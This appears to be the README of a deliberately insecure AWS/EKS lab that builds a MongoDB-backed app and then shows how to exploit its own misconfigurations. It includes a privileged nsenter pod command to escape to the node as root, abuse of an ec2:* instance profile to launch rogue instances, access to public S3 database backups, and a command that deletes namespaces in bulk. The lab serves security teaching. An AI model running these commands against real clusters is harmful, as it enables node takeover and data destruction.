# aws-tasky
This repo will build all required AWS Networking and resources to run a 3 tiered MongoDB app.  This includes EC2, EKS, S3, Route53, and AWS Config.  There are known insecure configurations in this repo.  The follow steps will highlight some of these and attempt to exploit them.

## Pre Reqs
- Setup shell with AWS credentials
- AWS Key Pair
- Terraform 1.3.7+
- aws cli
- kubectl
- helm
- curl
- jq

## Getting Started
```
cd quickstart/infra
```
Update the `my.auto.tfvars` for your environment.  Configure your existing AWS Key Pair or copy a local SSH key to your region using this script `./scripts/push-aws-sshkey-multiregion.sh`. Review the prefix being used for resource names, the EKS version, private zone name for route53, and external  CIDR for SSH access. 

### Provision Infrastructure
Use terraform to build the required AWS Infrastructure
```
terraform init
terraform apply -auto-approve
```
All AWS resources will be provisioned and configured to support the tasky application.

### Resource Overview
While the infrastructure is being provisioned review the resources that are being created.

#### Tasky Image
* [Dockerfile](https://github.com/ppresto/aws-tasky/blob/main/docker/Dockerfile.chainguard-static)

#### AWS VPC
* [Configuration](https://github.com/ppresto/aws-tasky/blob/main/quickstart/infra/locals-usw2.tf#L17)
* [terraform-aws-modules/vpc/aws](https://github.com/ppresto/aws-tasky/blob/main/quickstart/infra/main.tf)
#### AWS EC2
* [Configuration](https://github.com/ppresto/aws-tasky/blob/main/quickstart/infra/main.tf#L54)
* [IAM Profile](https://github.com/ppresto/aws-tasky/blob/main/modules/aws_ec2_iam_profile/iam-profile.tf)
    * Actions: "ec2:*","s3:GetObject","s3:PutObject","s3:PutObjectAcl","s3:DeleteObject","s3:ListBucket"
#### AWS Security Groups
  * [EC2](https://github.com/ppresto/aws-tasky/blob/main/modules/aws_ec2/main.tf#L30)
    * Ingress: Allow "0.0.0.0/0" -> TCP 22
    * Egress:  Allow "0.0.0.0/0: -> Any Protocol, Any Port
  * [MongoDB](https://github.com/ppresto/aws-tasky/blob/main/modules/aws_ec2_sg_mongod/main.tf#L12)
    * Ingress: Allow "10.15.0.0/20" -> TCP 27017
#### AWS Route53
* [mongoDB record](https://github.com/ppresto/aws-tasky/blob/main/quickstart/infra/main.tf#L82)

#### AWS S3
* [Public bucket](https://github.com/ppresto/aws-tasky/blob/main/quickstart/infra/main.tf#L115)

#### Mongo DB
* [DB build script](https://github.com/ppresto/aws-tasky/blob/main/modules/aws_ec2/templates/mongo.sh)

Its recommended to shift left to the Infrastructure pipeline and use Packer to build the mongodb image.  Leverage your standard secrets mgmt solution to configure DB access to avoid leaking sensitive data in the process.  This image was created using Terraform's user_data to keep everything simple and using a single tool.

#### AWS EKS Cluster 1.29
* [Configuration](https://github.com/ppresto/aws-tasky/blob/main/quickstart/infra/main.tf#L129)
* [terraform-aws-modules/eks/aws](https://github.com/ppresto/aws-tasky/blob/main/modules/aws_eks_cluster_alb/main.tf#L9)

#### AWS Loadbalancer controller
* [AWS LB controller](https://github.com/ppresto/aws-tasky/blob/main/modules/aws_eks_cluster_alb/aws_alb_controller.tf) 

This was installed as a best pratice to support internal NLB or ALBs to EKS services.  The required pulic subnet tags were added as part of the VPC creation to enable the ALB to discover EKS services in the private subnets.


## Connect to EKS
Connect to EKS using `scripts/kubectl_connect_eks.sh`.  Pass this script the path to the terraform state file used to provision the EKS cluster.  If cwd is ./infra like above then this command would look like the following:
```
source ../../scripts/kubectl_connect_eks.sh .
kubectl -n tasky get po
```
This script connects EKS and builds some useful aliases shown in the output.

## Get the Ingress URL
Use this URL to access the Tasky application.  Login to verify Tasky is healthy and create tasks.
```
make getIngress

Tasky URL - http://tasky-ingress-1379807902.us-west-2.elb.amazonaws.com
```
FYI: The Makefile can also be used to see pre and post security scans, build infra, and clean up the project.

## Tasky Application - Verify RBAC
Is the application running with cluster-admin privileges?

The tasky pod should be running a second container `network-multitool`.  To see if containers have cluster-admin privilages connect to the sidecar, install `kubectl`, and use it to **escape into the Working Node as root!**
```
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod 755 kubectl
```

Escape into the Node as **root** with kubectl
```
./kubectl run r00t --restart=Never -ti --rm --image tasky --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
## Public EC2 MongoDB - Verify ext SSH and RBAC
Get the public IP of the EC2 instance running Mongo DB
```
IP=$(terraform output -json | jq -r '.usw2_ec2_ip.value."usw2-shared-ext-mongodb"')
```

### Verify SSH is exposed externally  
```
ssh ubuntu@${IP}
```
This will use the AWS key that was defined in `my.auto.tfvars`

### Verify the EC2 Profile has to many privileges (ec2:*)
If an EC2 instance can assume this level of privilege it can easily provision new EC2 instances in any subnet, map it to any security group, and configure any SSH key pair.  Lets see how easy it is.

EC2 key pair creation
```
ssh-keygen
aws ec2 create-key-pair --key-name pp-keypair-test
```

EC2 Discovery

Find a public subnet that is routable from the internet and a security group you want to apply to your shadow instance
```
aws ec2 describe-subnets --filters "Name=tag:Tier,Values=Public" | grep SubnetId
aws ec2 describe-security-group-rules --query 'SecurityGroupRules[].[Description, SecurityGroupRuleId, ToPort, CidrIpv4]' --output table
```

EC2 Instance Creation
```
aws ec2 run-instances \
  --image-id ami-07fe743f8d6d95a40 \
  --instance-type t2.micro \
  --subnet-id subnet-09d0a1ac53cbdab60 \
  --security-group-ids sg-02c6b447d7387ae36 \
  --associate-public-ip-address \
  --key-name ppresto-ptfe-dev-key
```

Get the external IP to SSH to the new instance
```
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId, InstanceType, SubnetId, PublicIpAddress]' --output table
```

## Mongo DB Backups to S3
Verify the backups are going to S3, they are public, and can be downloaded.  Start by going to the S3 URL in your browser.
```
terraform output bucket_url
```
You should see a list of .tar.gz files.  These are the DB backups happening every 5 minutes.  Copy one of the file names and update the URL with `/<filename>`.  This should download the exact file.

## Notes
Delete other namespaces to show you have cluster-admin privileges
```
./kubectl get ns --no-headers=true | sed "/kube-*/d" | sed "/default/d" | sed "/tasky/d" | awk '{print $1;}' | xargs ./kubectl delete ns
```

## References
* [OWASP Cheatsheets](https://cheatsheetseries.owasp.org/index.html)
* [OWASP Cheatsheets Repo](https://github.com/OWASP/CheatSheetSeries)
* [2023 OSS Security Report](https://go.snyk.io/state-of-open-source-security-report-2023-dwn-typ.html)
* [HackTricksCloud](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/abusing-roles-clusterroles-in-kubernetes)